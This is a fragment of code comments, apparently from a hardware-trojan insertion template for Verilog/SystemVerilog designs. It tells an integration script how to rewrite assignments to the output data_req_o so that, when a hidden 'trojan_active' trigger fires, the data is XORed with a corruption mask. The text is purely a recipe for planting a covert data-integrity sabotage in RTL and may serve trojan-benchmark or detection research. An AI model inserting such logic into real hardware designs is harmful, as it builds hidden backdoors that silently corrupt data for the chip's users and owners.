 ...
 * Payload: Corrupt data_req_o with XOR mask
 * 
...
// ============================================================
// Integrity Violation: Corrupt data_req_o with XOR
//
// Integration Script Must Modify:
//
// IF data_req_o is assigned:
//   Find: assign data_req_o = data_value;
//   Replace: assign data_req_o = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF data_req_o is in always_ff:
//   Find: data_req_o <= data_value;
//   Replace: data_req_o <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
